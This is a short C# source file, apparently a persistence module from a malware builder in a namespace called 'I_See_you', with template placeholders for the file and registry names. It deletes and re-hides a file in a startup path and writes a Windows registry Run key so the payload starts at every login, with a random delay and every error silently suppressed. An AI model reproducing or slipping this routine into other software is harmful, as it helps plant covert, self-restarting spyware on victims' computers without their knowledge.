using System;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace I_See_you
{
    class Run
    {
        public static void Autorun()
        {
            Thread.Sleep(new Random().Next(1000, 2000));
            string path = RawSettings.StartUpPath + "\\"+"[sfileName]";
            try
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.SetAttributes(path, FileAttributes.Normal);
                        File.Delete(path);
                    }
                    catch
                    {
                    }
                }
                if (!File.Exists(path))
                {
                    try
                    {
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                    catch
                    {
                    }
                }
                using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
                {
                    registryKey.SetValue("[sRegKey]", RawSettings.StartUpPath + "\\"+"[sfileName]");
                }
            }
            catch
            {
            }
        }
    }
}
